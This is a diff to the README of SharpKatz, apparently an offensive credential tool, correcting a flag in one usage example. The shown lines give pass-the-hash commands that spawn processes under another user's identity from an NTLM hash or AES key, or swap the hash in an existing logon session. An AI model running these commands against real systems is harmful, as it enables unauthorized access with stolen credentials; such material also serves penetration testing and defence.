@@ -56,7 +56,7 @@ Perform pth to create a process under userdomain\username credential user's rc4 
 ```SharpKatz.exe --Command pth --Luid luid --NtlmHash ntlmhash```<br>
 Replace ntlm hash for an existing logonsession <br>
 <br>
-```SharpKatz.exe --Command pth --User username --Domain userdomain --NtlmHash ntlmhash --aes128 aes256```<br>
+```SharpKatz.exe --Command pth --User username --Domain userdomain --NtlmHash ntlmhash --aes256 aes256```<br>
 Perform pth to create a process under userdomain\username credential with ntlm hash of the user's password and aes256 key <br>
 <br>
 
